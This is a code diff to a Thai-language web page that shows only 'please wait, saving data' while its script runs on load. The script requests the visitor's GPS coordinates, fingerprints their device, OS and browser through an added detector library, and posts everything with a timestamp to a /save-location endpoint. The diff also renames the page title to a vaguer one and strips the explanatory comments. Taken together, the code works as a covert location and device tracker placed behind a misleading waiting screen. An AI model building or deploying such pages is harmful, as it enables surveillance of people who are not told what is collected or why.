@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>XP Tracker</title>
+  <title>xp</title>
   <style>
     table { border-collapse: collapse; width: 80%; margin-top: 20px;}
     th, td { border: 1px solid #ddd; padding: 8px;}
@@ -12,32 +12,55 @@
 <h1>กรุณารอสักครู่</h1>
 <p id="status">กำลังบันทึกข้อมูล...</p>
 
+<script src="https://cdn.jsdelivr.net/npm/device-detector-js@2.2.10/dist/device-detector.min.js"></script>
 <script>
 async function sendLocation() {
     let latitude = null;
     let longitude = null;
 
-    // รับตำแหน่ง GPS ถ้าอนุญาต
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((pos) => {
             latitude = pos.coords.latitude;
             longitude = pos.coords.longitude;
-            postData(latitude, longitude);
+            sendData(latitude, longitude);
         }, (err) => {
             console.log("GPS ไม่อนุญาต:", err.message);
-            postData(null, null);
+            sendData(null, null);
         });
     } else {
-        postData(null, null);
+        sendData(null, null);
     }
 }
 
-async function postData(lat, lon) {
+async function sendData(lat, lon) {
+    const deviceDetector = new DeviceDetector();
+    const userAgent = navigator.userAgent;
+    const deviceInfo = deviceDetector.parse(userAgent);
+
+    const deviceType = deviceInfo.device?.type || '-';
+    const deviceBrand = deviceInfo.device?.brand || '-';
+    const deviceModel = deviceInfo.device?.model || '-';
+    const osName = deviceInfo.os?.name || '-';
+    const osVersion = deviceInfo.os?.version || '-';
+    const browserName = deviceInfo.client?.name || '-';
+    const browserVersion = deviceInfo.client?.version || '-';
+
+    const visitTime = new Date().toISOString();
+
+    const payload = {
+        latitude: lat,
+        longitude: lon,
+        device: `${deviceType} (${deviceBrand} ${deviceModel})`,
+        os: `${osName} ${osVersion}`,
+        browser: `${browserName} ${browserVersion}`,
+        visitTime
+    };
+
     try {
         const res = await fetch('/save-location', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({latitude: lat, longitude: lon})
+            body: JSON.stringify(payload)
         });
         const data = await res.text();
         document.getElementById('status').innerText = data;
@@ -46,10 +69,10 @@ async function postData(lat, lon) {
     }
 }
 
-// เรียกทันทีเมื่อโหลดหน้าเว็บ
 window.onload = sendLocation;
 </script>
 
-<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด
+<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a> หรือ <a href="/history" target="_blank">ประวัติทั้งหมด</a></p>
+
 </body>
 </html>
